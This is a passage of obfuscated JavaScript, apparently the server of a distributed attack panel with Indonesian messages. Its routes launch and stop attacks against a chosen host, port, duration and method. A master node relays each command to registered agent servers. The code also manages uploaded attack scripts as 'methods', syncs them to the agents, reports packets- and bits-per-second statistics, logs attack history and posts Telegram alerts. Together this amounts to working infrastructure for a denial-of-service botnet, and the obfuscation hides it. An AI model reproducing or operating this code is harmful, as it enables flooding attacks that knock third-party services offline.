sendTelegramPhoto(_0x3365a6(0x246)+NODE_TYPE+')*\x0a'+(_0x3365a6(0x230)+escapeTelegram(_0x4e416c)+'`\x0a')+(_0x3365a6(0x1ec)+escapeTelegram(_0x1d4e75)+'`\x0a')+(_0x3365a6(0xea)+escapeTelegram(_0x26a910+'s')+'`\x0a')+('‚öîÔ∏è\x20*Metode:*\x20`'+escapeTelegram(_0x58e153)+'`\x0a')+(_0x3365a6(0xd0)+escapeTelegram(_0x26a96d)+'`\x0a')+(_0x3365a6(0xc7)+_0xe7cc5['ls'][_0x3365a6(0x1c8)]+'`'));let _0x1b74d2=[];if(NODE_TYPE==='master'){loadAgents();const _0x14de60=AGENT_LIST['filter'](_0x2725dc=>_0x2725dc['enabled']!==![]);_0x1b74d2=await Promise['all'](_0x14de60['map'](_0x337a2e=>axios[_0x3365a6(0x149)](_0x337a2e[_0x3365a6(0x24f)]+_0x3365a6(0x127),{'params':{'key':AGENT_KEY,'host':_0x4e416c,'port':_0x1d4e75,'time':_0x26a910,'method':_0x58e153},'timeout':0x1f40})[_0x3365a6(0xc5)](_0x4e8bf6=>({'agent':_0x337a2e,'status':'success','data':_0x4e8bf6['data']}))['catch'](_0x5eedee=>({'agent':_0x337a2e,'status':'failed','error':_0x5eedee[_0x3365a6(0x22d)]})))),logActivity(_0x3365a6(0x187),{'host':_0x4e416c,'targetPort':_0x1d4e75,'time':_0x26a910,'method':_0x58e153,'agentResults':_0x1b74d2});}return _0x75f00a[_0x3365a6(0xb6)]({'message':_0x3365a6(0xa7)+NODE_TYPE+')','processId':_0x26a96d,'pid':_0xe7cc5['ls'][_0x3365a6(0x1c8)],'agents':_0x1b74d2});}catch(_0x404904){logActivity(_0x3365a6(0x219),{'error':_0x404904[_0x3365a6(0xa4)]()}),_0x75f00a['status'](0x1f4)[_0x3365a6(0x1c3)](_0x3365a6(0x10a));}}),app['get'](_0x402d66(0x20f),async(_0x4b4d20,_0x5eecae)=>{const _0x38c193=_0x402d66;try{const {key:_0x1302f3}=_0x4b4d20[_0x38c193(0x170)];if(_0x1302f3!==apiKey)return _0x5eecae['status'](0x190)['send']('API\x20key\x20tidak\x20valid');if(NODE_TYPE===_0x38c193(0xaf)){Object[_0x38c193(0x184)](activeProcesses)[_0x38c193(0x1a5)](_0xfbb584=>{const _0x1a0bf1=_0x38c193;if(activeProcesses[_0xfbb584]?.['ls'])activeProcesses[_0xfbb584]['ls']['kill']('SIGINT');clearInterval(stats[_0xfbb584]?.[_0x1a0bf1(0x1a9)]),delete stats[_0xfbb584],delete activeProcesses[_0xfbb584],logActivity(_0x1a0bf1(0x133),{'processId':_0xfbb584,'isMaster':!![]}),broadcastWS({'type':_0x1a0bf1(0x167),'processId':_0xfbb584,'exitCode':_0x1a0bf1(0x179)}),updateAttackHistory(_0xfbb584,{'endTime':new Date()[_0x1a0bf1(0x259)](),'status':'stopped','exitCode':'stopped_by_user'});}),loadAgents();const _0x29d005=await Promise[_0x38c193(0x1dc)](AGENT_LIST[_0x38c193(0xe6)](_0x3cb6aa=>axios[_0x38c193(0x149)](_0x3cb6aa[_0x38c193(0x24f)]+_0x38c193(0x20f),{'params':{'key':AGENT_KEY},'timeout':0x1f40})[_0x38c193(0xc5)](_0x523e9a=>({'agent':_0x3cb6aa,'status':_0x38c193(0x1e1),'data':_0x523e9a['data']}))[_0x38c193(0x14c)](_0x36bd3a=>({'agent':_0x3cb6aa,'status':_0x38c193(0x20a),'error':_0x36bd3a[_0x38c193(0x22d)]}))));return logActivity(_0x38c193(0x182),{'agentResults':_0x29d005}),await sendTelegramPhoto(_0x38c193(0x1cb)+_0x29d005['map'](_0xe38867=>_0x38c193(0x106)+escapeTelegram(_0xe38867[_0x38c193(0x1b9)]['name']||_0xe38867['agent'][_0x38c193(0x24f)])+'`:\x20*'+_0xe38867['status']+'*')[_0x38c193(0x264)]('\x0a')),broadcastWS({'type':'all_stopped'}),_0x5eecae[_0x38c193(0xb6)]({'message':_0x38c193(0x140),'results':_0x29d005});}Object[_0x38c193(0x184)](activeProcesses)['forEach'](_0x20e03e=>{const _0x124f40=_0x38c193;if(activeProcesses[_0x20e03e]?.['ls'])activeProcesses[_0x20e03e]['ls'][_0x124f40(0x18d)](_0x124f40(0x231));clearInterval(stats[_0x20e03e]?.['_interval']),delete stats[_0x20e03e],delete activeProcesses[_0x20e03e],logActivity('STOP_PROCESS',{'processId':_0x20e03e}),broadcastWS({'type':_0x124f40(0x167),'processId':_0x20e03e,'exitCode':'stopped_by_user'}),updateAttackHistory(_0x20e03e,{'endTime':new Date()[_0x124f40(0x259)](),'status':'stopped','exitCode':_0x124f40(0x179)});}),await sendTelegramPhoto(_0x38c193(0x1ef)),broadcastWS({'type':_0x38c193(0x1ca)}),_0x5eecae[_0x38c193(0x1c3)](_0x38c193(0x257));}catch(_0x539dff){logActivity(_0x38c193(0x242),{'error':_0x539dff[_0x38c193(0xa4)]()}),_0x5eecae[_0x38c193(0x12f)](0x1f4)[_0x38c193(0x1c3)](_0x38c193(0x10a));}}),app[_0x402d66(0x149)](_0x402d66(0x191),(_0x2ee657,_0x585848)=>{const _0x50f0e1=_0x402d66,{key:_0x50e9f6}=_0x2ee657[_0x50f0e1(0x170)],{processId:_0x44ff65}=_0x2ee657[_0x50f0e1(0x119)],_0x5c8370=NODE_TYPE===_0x50f0e1(0xaf)?apiKey:AGENT_KEY;if(_0x50e9f6!==_0x5c8370)return _0x585848[_0x50f0e1(0x12f)](0x190)[_0x50f0e1(0x1c3)](_0x50f0e1(0x15d));if(!activeProcesses[_0x44ff65])return _0x585848['status'](0x194)['send'](_0x50f0e1(0xbd));try{if(activeProcesses[_0x44ff65]?.['ls'])activeProcesses[_0x44ff65]['ls']['kill'](_0x50f0e1(0x231));clearInterval(stats[_0x44ff65]?.[_0x50f0e1(0x1a9)]),delete stats[_0x44ff65],delete activeProcesses[_0x44ff65],logActivity('STOP_PROCESS_MANUAL',{'processId':_0x44ff65}),broadcastWS({'type':_0x50f0e1(0x167),'processId':_0x44ff65,'exitCode':_0x50f0e1(0x179)}),updateAttackHistory(_0x44ff65,{'endTime':new Date()['toISOString'](),'status':'stopped','exitCode':'stopped_by_user'}),_0x585848[_0x50f0e1(0xb6)]({'message':'Proses\x20dihentikan','processId':_0x44ff65});}catch(_0x1f715f){_0x585848[_0x50f0e1(0x12f)](0x1f4)[_0x50f0e1(0x1c3)](_0x50f0e1(0x209));}}),app[_0x402d66(0x149)](_0x402d66(0x10c),async(_0x17fac0,_0x499b48)=>{const _0x859ad=_0x402d66,{key:_0x2dde12}=_0x17fac0[_0x859ad(0x170)];if(_0x2dde12!==apiKey)return _0x499b48[_0x859ad(0x12f)](0x190)[_0x859ad(0x1c3)](_0x859ad(0x15d));const _0x379286={},_0x194f2b={};for(const _0x3ee081 in activeProcesses){const _0x1cf478=activeProcesses[_0x3ee081];_0x379286[_0x3ee081]={'status':_0x1cf478[_0x859ad(0x12f)],'lastResponse':_0x1cf478[_0x859ad(0x189)],'restartCount':_0x1cf478[_0x859ad(0x181)]||0x0,'pid':_0x1cf478['ls']?.[_0x859ad(0x1c8)],'script':_0x1cf478[_0x859ad(0x1b7)],'args':_0x1cf478[_0x859ad(0x102)],'rps':stats[_0x3ee081]?.['rps']||0x0,'pps':stats[_0x3ee081]?.[_0x859ad(0x12c)]||0x0,'bps':stats[_0x3ee081]?Number((stats[_0x3ee081]['bps']/0xf4240)[_0x859ad(0x1b1)](0x2)):0x0,'cpuPercent':null,'memoryMB':null};if(_0x1cf478['ls']?.['pid'])_0x194f2b[_0x3ee081]=_0x1cf478['ls'][_0x859ad(0x1c8)];}try{if(Object[_0x859ad(0x21d)](_0x194f2b)['length']>0x0){const _0x49b7ec=await pidusage(Object['values'](_0x194f2b));for(const [_0x34014d,_0xa96a9a]of Object[_0x859ad(0x20d)](_0x194f2b)){const _0x7db94a=_0x49b7ec[_0xa96a9a];_0x7db94a&&_0x379286[_0x34014d]&&(_0x379286[_0x34014d][_0x859ad(0x118)]=Number(_0x7db94a['cpu'][_0x859ad(0x1b1)](0x2)),_0x379286[_0x34014d][_0x859ad(0x16d)]=Math['round'](_0x7db94a[_0x859ad(0x17c)]/0x400/0x400));}}}catch(_0x346526){}const _0x41b327=os[_0x859ad(0xf3)]();let _0x1d4f83=0x0,_0x4d8565=0x0;_0x41b327['forEach'](_0x2836dd=>{const _0x247e4b=_0x859ad;for(let _0x4e90af in _0x2836dd[_0x247e4b(0xf8)])_0x4d8565+=_0x2836dd[_0x247e4b(0xf8)][_0x4e90af];_0x1d4f83+=_0x2836dd[_0x247e4b(0xf8)][_0x247e4b(0xcc)];});const _0x3f8d76=_0x1d4f83/_0x41b327[_0x859ad(0x1cd)],_0x5b0764=_0x4d8565/_0x41b327['length'],_0x25b489=0x64-~~(0x64*_0x3f8d76/_0x5b0764),_0x299fff=os[_0x859ad(0xbf)](),_0x3a0653=os['freemem'](),_0x536c96=Math['round']((_0x299fff-_0x3a0653)/0x400/0x400),_0x523b7d=Math['round'](_0x299fff/0x400/0x400);if(NODE_TYPE===_0x859ad(0xaf)){loadAgents();const _0x206d62=await Promise['all'](AGENT_LIST['map'](async _0x52701e=>{const _0x3b139a=_0x859ad,_0x38440a=Date[_0x3b139a(0x117)]();try{const _0x55f929=await axios[_0x3b139a(0x149)](_0x52701e[_0x3b139a(0x24f)]+'/api/attack/stats',{'params':{'key':AGENT_KEY},'timeout':0x1f40}),_0xd3d63c=Date[_0x3b139a(0x117)]()-_0x38440a;return{'agent':_0x52701e,'status':'success','data':{..._0x55f929[_0x3b139a(0x1e4)],'ping':_0xd3d63c}};}catch(_0xecc585){return{'agent':_0x52701e,'status':'failed','error':_0xecc585[_0x3b139a(0x22d)]};}}));return _0x499b48[_0x859ad(0xb6)]({'master':{'processStats':_0x379286,'serverResource':{'cpuUsagePercent':_0x25b489,'usedMemoryMB':_0x536c96,'totalMemoryMB':_0x523b7d,'memoryUsagePercent':Math[_0x859ad(0x147)](0x64*_0x536c96/_0x523b7d),'uptimeSeconds':Math[_0x859ad(0xe0)](process[_0x859ad(0x195)]())}},'agentStats':_0x206d62});}_0x499b48[_0x859ad(0xb6)]({'processStats':_0x379286,'serverResource':{'cpuUsagePercent':_0x25b489,'usedMemoryMB':_0x536c96,'totalMemoryMB':_0x523b7d,'memoryUsagePercent':Math[_0x859ad(0x147)](0x64*_0x536c96/_0x523b7d),'uptimeSeconds':Math[_0x859ad(0xe0)](process[_0x859ad(0x195)]())}});}),app['get'](_0x402d66(0xb1),(_0x471a0b,_0x40694b)=>{const _0x24bd82=_0x402d66;if(_0x471a0b[_0x24bd82(0x170)][_0x24bd82(0x1f0)]!==apiKey)return _0x40694b[_0x24bd82(0x12f)](0x190)['send'](_0x24bd82(0x15d));_0x40694b['json'](readHistory());}),app['delete'](_0x402d66(0x218),(_0x55c2c2,_0x3dc1da)=>{const _0xd8dc7c=_0x402d66;if(_0x55c2c2[_0xd8dc7c(0x170)][_0xd8dc7c(0x1f0)]!==apiKey)return _0x3dc1da[_0xd8dc7c(0x12f)](0x190)[_0xd8dc7c(0x1c3)](_0xd8dc7c(0x15d));fs[_0xd8dc7c(0x154)](historyPath,'[]','utf8'),_0x3dc1da[_0xd8dc7c(0x1c3)]('Attack\x20history\x20cleared.');}),app[_0x402d66(0x149)](_0x402d66(0xca),(_0x1e4989,_0xf8b36a)=>{const _0xaaf191=_0x402d66;if(_0x1e4989[_0xaaf191(0x170)][_0xaaf191(0x1f0)]!==apiKey)return _0xf8b36a[_0xaaf191(0x12f)](0x190)[_0xaaf191(0x1c3)](_0xaaf191(0x15d));_0xf8b36a[_0xaaf191(0xb6)](readMethods());}),app[_0x402d66(0x1a2)](_0x402d66(0xca),express[_0x402d66(0xb6)](),(_0x8e2f2a,_0x2fa436)=>{const _0x3b5a95=_0x402d66;if(_0x8e2f2a[_0x3b5a95(0x170)][_0x3b5a95(0x1f0)]!==apiKey)return _0x2fa436[_0x3b5a95(0x12f)](0x190)['send'](_0x3b5a95(0x15d));const {name:_0x343bf8,script:_0x23f876,args:_0x3a1bee}=_0x8e2f2a[_0x3b5a95(0x1d3)];if(!_0x343bf8||!_0x23f876||!Array['isArray'](_0x3a1bee))return _0x2fa436[_0x3b5a95(0x12f)](0x190)['send']('Format\x20salah');const _0x319fe6=readMethods();_0x319fe6[_0x343bf8]={'script':_0x23f876,'args':_0x3a1bee},writeMethods(_0x319fe6),logActivity(_0x3b5a95(0x17e),{'name':_0x343bf8,'script':_0x23f876,'args':_0x3a1bee}),_0x2fa436[_0x3b5a95(0xb6)]({'message':_0x3b5a95(0x104),'name':_0x343bf8});}),app[_0x402d66(0xae)](_0x402d66(0x150),(_0x463295,_0x286f53)=>{const _0x1e5257=_0x402d66;if(_0x463295[_0x1e5257(0x170)][_0x1e5257(0x1f0)]!==apiKey)return _0x286f53[_0x1e5257(0x12f)](0x190)[_0x1e5257(0x1c3)](_0x1e5257(0x15d));const _0x4d83ec=_0x463295['params'][_0x1e5257(0x212)],{name:_0x1009cb,script:_0x2432d8,args:_0x38639e}=_0x463295[_0x1e5257(0x1d3)];if(!_0x1009cb||!_0x2432d8||!Array[_0x1e5257(0x190)](_0x38639e))return _0x286f53[_0x1e5257(0x12f)](0x190)['send']('Format\x20salah');const _0x43d78a=readMethods();if(!_0x43d78a[_0x4d83ec])return _0x286f53[_0x1e5257(0x12f)](0x194)[_0x1e5257(0x1c3)](_0x1e5257(0xac));if(_0x4d83ec!==_0x1009cb)delete _0x43d78a[_0x4d83ec];_0x43d78a[_0x1009cb]={'script':_0x2432d8,'args':_0x38639e},writeMethods(_0x43d78a),logActivity(_0x1e5257(0x14d),{'oldName':_0x4d83ec,'newName':_0x1009cb,'script':_0x2432d8,'args':_0x38639e}),_0x286f53[_0x1e5257(0xb6)]({'message':_0x1e5257(0x148),'name':_0x1009cb});}),app[_0x402d66(0x1eb)](_0x402d66(0x256),async(_0x3b5e2c,_0x16ab65)=>{const _0x295f91=_0x402d66;if(_0x3b5e2c[_0x295f91(0x170)][_0x295f91(0x1f0)]!==apiKey)return _0x16ab65[_0x295f91(0x12f)](0x190)['send'](_0x295f91(0x15d));loadAgents();const _0x33ebd0=readMethods(),_0x26e0da=_0x3b5e2c[_0x295f91(0x119)]['name'];if(!_0x33ebd0[_0x26e0da])return _0x16ab65['status'](0x194)[_0x295f91(0x1c3)](_0x295f91(0x131));const _0x40b87f=_0x33ebd0[_0x26e0da][_0x295f91(0x1f8)];delete _0x33ebd0[_0x26e0da],writeMethods(_0x33ebd0),logActivity('DELETE_METHOD',{'name':_0x26e0da,'scriptFile':_0x40b87f});let _0x532912=![];if(_0x40b87f){const _0xf9f800=path['join'](uploadDir,_0x40b87f);fs[_0x295f91(0x25e)](_0xf9f800)&&(fs[_0x295f91(0x1a6)](_0xf9f800),_0x532912=!![],logActivity('DELETE_METHOD_FILE_AUTO',{'scriptFile':_0x40b87f}));}let _0x3fdc4a=[];NODE_TYPE===_0x295f91(0xaf)&&AGENT_LIST&&AGENT_LIST[_0x295f91(0x1cd)]&&_0x40b87f&&(_0x3fdc4a=await Promise[_0x295f91(0x1dc)](AGENT_LIST[_0x295f91(0xe6)](_0x2febed=>axios[_0x295f91(0x1a2)](_0x2febed[_0x295f91(0x24f)]+_0x295f91(0x1e9),{'key':AGENT_KEY,'filename':_0x40b87f})[_0x295f91(0xc5)](()=>({'agent':_0x2febed,'status':_0x295f91(0x1e1)}))['catch'](_0x437d6d=>({'agent':_0x2febed,'status':_0x295f91(0x20a),'error':_0x437d6d[_0x295f91(0x22d)]})))),logActivity(_0x295f91(0x16e),{'scriptFile':_0x40b87f,'results':_0x3fdc4a})),_0x16ab65['json']({'message':_0x295f91(0x1c5),'name':_0x26e0da,'fileDeleted':_0x532912,'sync':_0x3fdc4a});}),app['post'](_0x402d66(0xa1),upload['single'](_0x402d66(0x1bd)),async(_0x51de76,_0x13190a)=>{const _0x77ee56=_0x402d66,_0x2b738d=_0x51de76[_0x77ee56(0x170)][_0x77ee56(0x1f0)]||_0x51de76['body'][_0x77ee56(0x1f0)];if(_0x2b738d!==apiKey)return _0x13190a['status'](0x190)[_0x77ee56(0x1c3)]('API\x20key\x20tidak\x20valid');if(!_0x51de76[_0x77ee56(0x1bd)])return _0x13190a[_0x77ee56(0x12f)](0x190)[_0x77ee56(0x1c3)](_0x77ee56(0x225));const _0x4b795c=[_0x77ee56(0xc0),_0x77ee56(0xc6),_0x77ee56(0xd4)],_0x1432ae=_0x51de76[_0x77ee56(0x1bd)]['originalname'][_0x77ee56(0x237)]();if(_0x4b795c[_0x77ee56(0xd1)](_0x1432ae)||_0x1432ae['includes']('..'))return fs['unlinkSync'](_0x51de76[_0x77ee56(0x1bd)]['path']),logActivity(_0x77ee56(0x145),{'file':_0x1432ae}),_0x13190a[_0x77ee56(0x12f)](0x190)[_0x77ee56(0x1c3)](_0x77ee56(0xe8));let _0x37e05b='';try{_0x37e05b=fs[_0x77ee56(0x152)](_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0x10d)],_0x77ee56(0xef));}catch(_0x37a1f1){return fs[_0x77ee56(0x1a6)](_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0x10d)]),_0x13190a[_0x77ee56(0x12f)](0x190)[_0x77ee56(0x1c3)](_0x77ee56(0x18e));}for(const _0x5a8cc5 of DANGEROUS_KEYWORDS){if(_0x37e05b['includes'](_0x5a8cc5))return fs[_0x77ee56(0x1a6)](_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0x10d)]),logActivity('BLOCK_UPLOAD',{'file':_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0xa3)],'keyword':_0x5a8cc5}),await sendTelegramPhoto('üö´\x20*Upload\x20file\x20diblokir*\x0a'+('*Keyword\x20berbahaya\x20terdeteksi:*\x20`'+escapeTelegram(_0x5a8cc5)+_0x77ee56(0x112))+(_0x77ee56(0xb9)+escapeTelegram(_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0xa3)])+'`')),_0x13190a[_0x77ee56(0x12f)](0x190)['send'](_0x77ee56(0xf7)+_0x5a8cc5+'\x22)');}let _0x12d302=_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0x201)],_0x587f7a=path[_0x77ee56(0x264)](uploadDir,_0x12d302);const _0xe471da=path[_0x77ee56(0x232)](_0x12d302),_0x3c9e22=path['basename'](_0x12d302,_0xe471da);let _0x518284=0x1;while(fs['existsSync'](_0x587f7a)){_0x12d302=_0x3c9e22+'_'+_0x518284+_0xe471da,_0x587f7a=path[_0x77ee56(0x264)](uploadDir,_0x12d302),_0x518284++;}try{fs[_0x77ee56(0x202)](_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0x10d)],_0x587f7a);}catch(_0x3d931f){return _0x13190a['status'](0x1f4)[_0x77ee56(0x1c3)](_0x77ee56(0x11d));}logActivity(_0x77ee56(0x23a),{'file':_0x12d302,'size':_0x51de76[_0x77ee56(0x1bd)][_0x77ee56(0xbe)]}),await sendTelegramPhoto(_0x77ee56(0x233)+('*Nama:*\x20`'+escapeTelegram(_0x12d302)+'`\x0a')+(_0x77ee56(0x114)+_0x51de76[_0x77ee56(0x1bd)]['size']+_0x77ee56(0x116))),_0x13190a[_0x77ee56(0xb6)]({'message':'File\x20berhasil\x20di-upload','fileName':_0x12d302,'path':_0x77ee56(0x144)+_0x12d302});}),app[_0x402d66(0x149)](_0x402d66(0x11a),(_0x59751e,_0x784821)=>{const _0x2d313b=_0x402d66;if(_0x59751e[_0x2d313b(0x170)][_0x2d313b(0x1f0)]!==apiKey)return _0x784821['status'](0x190)[_0x2d313b(0x1c3)](_0x2d313b(0x15d));fs[_0x2d313b(0x177)](uploadDir,(_0x3e5e91,_0x2def45)=>{const _0x66e10c=_0x2d313b;if(_0x3e5e91)return _0x784821[_0x66e10c(0x12f)](0x1f4)[_0x66e10c(0x1c3)](_0x66e10c(0xb0));const _0x3d62bf=_0x2def45[_0x66e10c(0x12b)](_0x5a2f49=>!_0x5a2f49[_0x66e10c(0x1b8)]('.'))['map'](_0x15de56=>{const _0x1cca1f=_0x66e10c,_0x385236=fs[_0x1cca1f(0xd5)](path['join'](uploadDir,_0x15de56));return{'name':_0x15de56,'size':_0x385236['size'],'mtime':_0x385236[_0x1cca1f(0x169)]};});_0x784821['json'](_0x3d62bf);});}),app[_0x402d66(0x1eb)](_0x402d66(0x188),async(_0x1cef55,_0x2379f3)=>{const _0x52dd70=_0x402d66;if(_0x1cef55[_0x52dd70(0x170)]['key']!==apiKey)return _0x2379f3[_0x52dd70(0x12f)](0x190)[_0x52dd70(0x1c3)]('API\x20key\x20tidak\x20valid');const _0x10940d=_0x1cef55['params'][_0x52dd70(0xa3)],_0x24435c=path[_0x52dd70(0x264)](uploadDir,_0x10940d);if(!fs[_0x52dd70(0x25e)](_0x24435c))return _0x2379f3[_0x52dd70(0x12f)](0x194)[_0x52dd70(0x1c3)](_0x52dd70(0x1c6));fs[_0x52dd70(0x1a6)](_0x24435c),logActivity(_0x52dd70(0x247),{'file':_0x10940d});if(NODE_TYPE===_0x52dd70(0xaf)&&AGENT_LIST&&AGENT_LIST[_0x52dd70(0x1cd)]){const _0x367444=await Promise[_0x52dd70(0x1dc)](AGENT_LIST[_0x52dd70(0xe6)](_0x284775=>axios['post'](_0x284775['url']+_0x52dd70(0x1e9),{'key':AGENT_KEY,'filename':_0x10940d})[_0x52dd70(0xc5)](()=>({'agent':_0x284775,'status':_0x52dd70(0x1e1)}))[_0x52dd70(0x14c)](_0x234c26=>({'agent':_0x284775,'status':_0x52dd70(0x20a),'error':_0x234c26[_0x52dd70(0x22d)]}))));logActivity(_0x52dd70(0x16e),{'filename':_0x10940d,'results':_0x367444});}_0x2379f3['json']({'message':_0x52dd70(0x213),'file':_0x10940d});}),app[_0x402d66(0x149)](_0x402d66(0x263),(_0x18bd1b,_0x28e185)=>{const _0x33dee7=_0x402d66;if(_0x18bd1b[_0x33dee7(0x170)]['key']!==apiKey)return _0x28e185[_0x33dee7(0x12f)](0x190)[_0x33dee7(0x1c3)]('API\x20key\x20tidak\x20valid');const _0x466f21=_0x18bd1b[_0x33dee7(0x119)]['filename'],_0x49c6c8=path[_0x33dee7(0x264)](uploadDir,_0x466f21);if(!fs['existsSync'](_0x49c6c8))return _0x28e185[_0x33dee7(0x12f)](0x194)['send'](_0x33dee7(0x1c6));_0x28e185[_0x33dee7(0xa6)](_0x49c6c8);}),app[_0x402d66(0x1a2)](_0x402d66(0x23e),express[_0x402d66(0xb6)](),(_0x2e5b68,_0x35f886)=>{const _0x1705ae=_0x402d66,{oldName:_0x33e4be,newName:_0x405fc8,key:_0x2bc5cc}=_0x2e5b68[_0x1705ae(0x1d3)];if(_0x2bc5cc!==apiKey)return _0x35f886[_0x1705ae(0x12f)](0x190)[_0x1705ae(0x1c3)](_0x1705ae(0x15d));if(!_0x33e4be||!_0x405fc8)return _0x35f886[_0x1705ae(0x12f)](0x190)['send'](_0x1705ae(0x235));const _0x1ea058=path['join'](uploadDir,_0x33e4be),_0x49b797=path['join'](uploadDir,_0x405fc8);if(!fs[_0x1705ae(0x25e)](_0x1ea058))return _0x35f886[_0x1705ae(0x12f)](0x194)['send']('File\x20lama\x20tidak\x20ditemukan');if(fs[_0x1705ae(0x25e)](_0x49b797))return _0x35f886[_0x1705ae(0x12f)](0x199)['send'](_0x1705ae(0x1f7));fs['renameSync'](_0x1ea058,_0x49b797),logActivity(_0x1705ae(0x13e),{'from':_0x33e4be,'to':_0x405fc8}),_0x35f886[_0x1705ae(0xb6)]({'message':_0x1705ae(0x217),'from':_0x33e4be,'to':_0x405fc8});}),app['get'](_0x402d66(0x135),(_0x5395b7,_0x346877)=>{const _0x2598ac=_0x402d66;if(_0x5395b7[_0x2598ac(0x170)]['key']!==apiKey)return _0x346877[_0x2598ac(0x12f)](0x190)[_0x2598ac(0x1c3)](_0x2598ac(0x15d));const _0xe70cc2=_0x5395b7[_0x2598ac(0x119)][_0x2598ac(0xa3)],_0x1e0bb7=path[_0x2598ac(0x264)](uploadDir,_0xe70cc2);if(!fs[_0x2598ac(0x25e)](_0x1e0bb7))return _0x346877[_0x2598ac(0x12f)](0x194)[_0x2598ac(0x1c3)](_0x2598ac(0x1c6));_0x346877[_0x2598ac(0x15c)](_0x2598ac(0x250))['send'](fs[_0x2598ac(0x152)](_0x1e0bb7,'utf8'));}),app[_0x402d66(0x1a2)](_0x402d66(0xee),express['text']({'type':_0x402d66(0x19e),'limit':'5mb'}),async(_0x2e708b,_0x45b185)=>{const _0x146932=_0x402d66;if(_0x2e708b[_0x146932(0x170)]['key']!==apiKey)return _0x45b185[_0x146932(0x12f)](0x190)[_0x146932(0x1c3)]('API\x20key\x20tidak\x20valid');loadAgents();const _0x34e3a0=_0x2e708b[_0x146932(0x119)]['filename'],_0x2cfe66=path[_0x146932(0x264)](uploadDir,_0x34e3a0);if(!fs[_0x146932(0x25e)](_0x2cfe66))return _0x45b185[_0x146932(0x12f)](0x194)[_0x146932(0x1c3)](_0x146932(0x1c6));fs[_0x146932(0x154)](_0x2cfe66,_0x2e708b[_0x146932(0x1d3)],_0x146932(0xef)),logActivity(_0x146932(0xd7),{'file':_0x34e3a0});let _0x987d2b=[];NODE_TYPE===_0x146932(0xaf)&&AGENT_LIST&&AGENT_LIST[_0x146932(0x1cd)]&&(_0x987d2b=await Promise['all'](AGENT_LIST['map'](_0x913673=>{const _0x47fab4=_0x146932,_0x35f9b2=new FormData();return _0x35f9b2['append'](_0x47fab4(0x1f0),AGENT_KEY),_0x35f9b2['append'](_0x47fab4(0x1bd),fs['createReadStream'](_0x2cfe66),_0x34e3a0),axios[_0x47fab4(0x1a2)](_0x913673[_0x47fab4(0x24f)]+'/api/update',_0x35f9b2,{'headers':_0x35f9b2[_0x47fab4(0x12e)](),'timeout':0x2710})[_0x47fab4(0xc5)](_0x4cd77=>({'agent':_0x913673,'status':_0x47fab4(0x1e1),'data':_0x4cd77['data']}))[_0x47fab4(0x14c)](_0x2d3da6=>({'agent':_0x913673,'status':_0x47fab4(0x20a),'error':_0x2d3da6[_0x47fab4(0x22d)]}));})),logActivity(_0x146932(0x10b),{'filename':_0x34e3a0,'syncResults':_0x987d2b})),_0x45b185[_0x146932(0xb6)]({'message':_0x146932(0x1ee),'file':_0x34e3a0,'sync':_0x987d2b});}),app[_0x402d66(0x149)](_0x402d66(0xe1),(_0x6cd056,_0x1a159f)=>{const _0x48661b=_0x402d66;if(_0x6cd056[_0x48661b(0x170)][_0x48661b(0x1f0)]!==apiKey)return _0x1a159f[_0x48661b(0x12f)](0x190)[_0x48661b(0x1c3)]('API\x20key\x20tidak\x20valid');loadAgents(),_0x1a159f[_0x48661b(0xb6)](AGENT_LIST);}),app[_0x402d66(0x1a2)]('/api/agents',express[_0x402d66(0xb6)](),(_0x216a36,_0x3272ea)=>{const _0x4e2078=_0x402d66;if(_0x216a36[_0x4e2078(0x170)][_0x4e2078(0x1f0)]!==apiKey)return _0x3272ea[_0x4e2078(0x12f)](0x190)['send'](_0x4e2078(0x15d));const {name:_0x1dfd83,url:_0x2230e0}=_0x216a36[_0x4e2078(0x1d3)];if(!_0x1dfd83||!_0x2230e0)return _0x3272ea[_0x4e2078(0x12f)](0x190)['send'](_0x4e2078(0x196));loadAgents();if(AGENT_LIST[_0x4e2078(0xf2)](_0x3875ee=>_0x3875ee['name']===_0x1dfd83))return _0x3272ea[_0x4e2078(0x12f)](0x190)[_0x4e2078(0x1c3)]('Agent\x20dengan\x20nama\x20ini\x20sudah\x20ada');const _0x1e0142={'name':_0x1dfd83,'url':_0x2230e0,'enabled':!![]};AGENT_LIST[_0x4e2078(0x210)](_0x1e0142),saveAgents(),logActivity(_0x4e2078(0x1a3),_0x1e0142),_0x3272ea[_0x4e2078(0xb6)]({'message':'Agent\x20ditambahkan','agent':_0x1e0142});}),app[_0x402d66(0xae)](_0x402d66(0x108),express[_0x402d66(0xb6)](),(_0x41a14a,_0x1cda26)=>{const _0x447bf8=_0x402d66;if(_0x41a14a[_0x447bf8(0x170)][_0x447bf8(0x1f0)]!==apiKey)return _0x1cda26['status'](0x190)['send'](_0x447bf8(0x15d));const _0x31a93f=_0x41a14a[_0x447bf8(0x119)]['name'],{url:_0x7cd7ce,enabled:_0x427d3b}=_0x41a14a[_0x447bf8(0x1d3)];loadAgents();const _0x47be83=AGENT_LIST[_0x447bf8(0x1ad)](_0x35e453=>_0x35e453['name']===_0x31a93f);if(_0x47be83===-0x1)return _0x1cda26['status'](0x194)[_0x447bf8(0x1c3)](_0x447bf8(0xf9));if(_0x7cd7ce!==undefined)AGENT_LIST[_0x47be83]['url']=_0x7cd7ce;if(_0x427d3b!==undefined)AGENT_LIST[_0x47be83]['enabled']=!!_0x427d3b;saveAgents(),logActivity(_0x447bf8(0x137),AGENT_LIST[_0x47be83]),_0x1cda26[_0x447bf8(0xb6)]({'message':_0x447bf8(0x122),'agent':AGENT_LIST[_0x47be83]});}),app[_0x402d66(0x1eb)](_0x402d66(0x108),(_0x37505c,_0x17b769)=>{const _0x2bfb09=_0x402d66;if(_0x37505c[_0x2bfb09(0x170)]['key']!==apiKey)return _0x17b769[_0x2bfb09(0x12f)](0x190)[_0x2bfb09(0x1c3)]('API\x20key\x20tidak\x20valid');const _0x41d184=_0x37505c[_0x2bfb09(0x119)][_0x2bfb09(0x251)];loadAgents();const _0x541cc4=AGENT_LIST['findIndex'](_0xf8e418=>_0xf8e418['name']===_0x41d184);if(_0x541cc4===-0x1)return _0x17b769[_0x2bfb09(0x12f)](0x194)['send']('Agent\x20tidak\x20ditemukan');const 